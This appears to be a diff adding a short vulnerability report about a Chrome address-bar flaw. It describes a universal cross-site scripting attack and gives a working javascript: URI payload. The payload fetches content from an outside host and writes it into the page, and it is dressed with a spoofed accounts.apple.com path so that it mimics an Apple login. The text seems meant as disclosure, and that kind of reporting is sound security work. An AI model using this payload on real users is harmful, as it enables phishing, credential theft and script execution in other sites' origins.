@@ -1,0 +1,5 @@
+Also this can lead to UXSS since chrome allows top navigation to javascript: URI and since our current url is javascript: we just need the user to tap the address bar and change something from it and in background we will redirect to google.com when the user press enter our code will be executed in context of google.com
+
+Address bar POC code: Text -> Chrome -> Open Text
+javascript:fetch('https://pwr.wtf/fakeapple.php').then(r=>{r.text().then(w=>{document.write(w)})});alert(origin)
+//accounts.apple.com/login?oauth=1&a///
